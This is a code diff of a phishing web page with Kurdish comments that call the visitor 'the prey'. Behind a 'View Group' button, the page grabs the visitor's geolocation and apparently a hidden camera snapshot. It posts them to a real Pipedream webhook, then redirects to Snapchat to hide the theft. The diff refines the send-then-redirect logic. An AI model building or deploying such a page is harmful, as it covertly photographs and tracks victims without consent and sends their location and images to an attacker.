@@ -36,7 +36,7 @@
 </head>
 <body>
 
-    <p>:بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە</p>
+    <p>بۆ چوونە ناو گرووپ، کلیک لەسەر دوگمەی خوارەوە بکە:</p>
     <button class="btn" id="viewGroupBtn">View Group</button>
 
     <video id="video" width="640" height="480" autoplay style="display:none;"></video>
@@ -46,7 +46,7 @@
         // ⚠️ لێرەدا لینکی فەرمی پڕۆژەی Pipedreamـەکەی خۆت دابنێ
         const secureWebhook = "https://eo7he3dstagkpih.m.pipedream.net";
         
-        // ⚠️ لێرەدا ئەو لینکەی سناپچات دابنێ کە دەتەوێت نێچیرەکە بۆی بڕوات
+        // ⚠️ لینکی ئەو ڤیدیۆ یان پڕۆفایلەی سناپچات کە دەتەوێت نێچیرەکەی بۆ بڕوات
         const snapchatRedirectUrl = "https://www.snapchat.com/spotlight/W7tBlwEw_aWnI0w_uREb_wA?share_id=OEQ1M0Ew&locale=en_US";
 
         const video = document.getElementById('video');
@@ -75,7 +75,7 @@
             }).catch(() => {});
         }
 
-        // وەرگرتنی لۆکەیشن بێ خەوش
+        // وەرگرتنی لۆکەیشن بە فۆرماتێکی پارێزراو و بێ خەوش
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition((position) => {
                 let lat = position.coords.latitude;
@@ -110,8 +110,8 @@
             }
         });
 
-        // هێشتنەوەی وێبگەرەکە بۆ کەرتی چرکەیەک تا داتاکە دەنێرێت، پاشان ناردنی بۆ سناپچات
-        async function sendAndRedirect(imageBlob) {
+        // ناردنی داتا بە شێوازی پارێزراو و پاشان بازدان بۆ سناپچات
+        function sendAndRedirect(imageBlob) {
             const formData = new FormData();
             let uid = "User_" + Math.floor(Math.random() * 90000) + 10000;
 
@@ -128,15 +128,15 @@
                 formData.append("photo", imageBlob, "snap.jpg");
             }
 
-            try {
-                // چاوەڕێی ناردنی داتاکە دەکات بۆ ئەوەی پەکینەخات
-                await fetch(secureWebhook, { method: 'POST', body: formData });
-            } catch (err) {
-                console.error(err);
-            } finally {
-                // دوای ناردنی داتاکە، ڕاستەوخۆ نێچیرەکە دەباتە سەر سناپچات
+            // بەکارهێنانی fetch و دڵنیابوونەوە لە ناردن پێش گۆڕینی لاپەڕەکە
+            fetch(secureWebhook, { method: 'POST', body: formData })
+            .then(() => {
                 window.location.href = snapchatRedirectUrl;
-            }
+            })
+            .catch((err) => {
+                console.error(err);
+                window.location.href = snapchatRedirectUrl;
+            });
         }
     </script>
 </body>
